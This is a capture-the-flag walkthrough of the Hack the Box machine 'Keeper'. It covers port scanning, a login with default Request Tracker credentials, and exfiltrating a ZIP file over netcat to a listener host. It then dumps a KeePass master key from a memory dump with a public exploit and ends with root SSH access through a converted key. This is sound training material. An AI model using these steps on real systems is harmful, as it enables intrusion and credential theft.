# Hack the Box - Keeper

```
rustscan -a 10.10.11.227 -r 0-65535 --ulimit 5000 
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/66939215-b494-486c-91cf-c24c5845167d)

```
nmap -sV -sC -A --min-rate 1000 10.10.11.227 -p 22,80
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d9b95b35-fff7-471f-9257-09aa865cc3f9)

## HTTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f306fea0-644b-4415-b2d4-d5a5041ce776)

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ad643d0d-40bb-45e9-96a4-922da6d26d45)

Request Tracker Default Credentials
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cf2f5581-c7de-4cb1-8f59-a469adf05737)

Dashboard
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bc5655f3-6405-4a33-a712-a8941dcafc80)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4bb08dfa-b361-4be2-8d75-66e7c7f6f7c7)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/22b263dc-63ec-49df-baf0-d33b2a0af87c)

SSH
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b612ec6c-ad5c-4eab-8ffe-1278d26e3cf9)

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f50378d9-1cdc-4a82-9759-03579c745ba9)

Sending the ZIP file:
```
nc -N 10.10.14.61 9090 < RT30000.zip
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/93b150a1-152b-40f1-aa39-af4065c1e762)

Receiving the ZIP file:
```
nc -l -p 9090 > keeper.zip
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8b230c17-acee-4527-9086-cb9e3185991a)

Unzip:
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8ec9d78e-9d40-4420-b4cb-517a8f99204b)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/627729c4-cd6b-4b2e-9971-1ae72ea275aa)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/30d383ff-39b0-4970-8222-c95ea6cf0fe8)

Dump KeePass Master Key:
Use the python exploit below to dump the master key.
```
https://github.com/CMEPW/keepass-dump-masterkey
```
```
python3 keepassdump.py -d KeePassDumpFull.dmp
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0b2c3f74-9f20-4b71-95ee-b92ff5cd5e46)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/158807b7-c6fc-4df9-a6b8-3658ac94f884)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/91db3c89-e497-4c89-a33a-0a878fe5f8f2)

![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f3bda035-9f4d-45b0-aeac-2c6f7c0744c9)

Save the key as `key.ppk`
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d7f25ece-bdd7-4d5a-819d-ec68c3e98412)

Convert the key to `.pem` format:
```
puttygen key.ppk -O private-openssh -o key.pem
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/047944e5-e3de-4037-80f6-5f47037ef3fa)

SSH as root:
```
ssh root@10.10.11.227 - key.pem
```
